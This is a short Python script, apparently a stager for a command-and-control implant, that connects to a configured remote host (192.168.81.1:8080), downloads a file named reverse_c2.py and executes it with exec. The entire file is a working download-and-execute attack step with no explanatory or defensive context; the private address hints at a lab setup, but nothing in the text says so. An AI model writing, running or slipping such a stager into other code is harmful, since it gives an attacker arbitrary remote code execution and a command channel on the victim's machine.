#!/usr/bin/env python3

from urllib.request import urlopen

# Config
RHOST = "192.168.81.1"
RPORT = 8080

# Grab script
url = f"http://{RHOST}:{RPORT}/scripts/remote/reverse_c2.py"
reverse_c2 = urlopen(url).read().decode("utf-8")

# Exec script
exec(reverse_c2)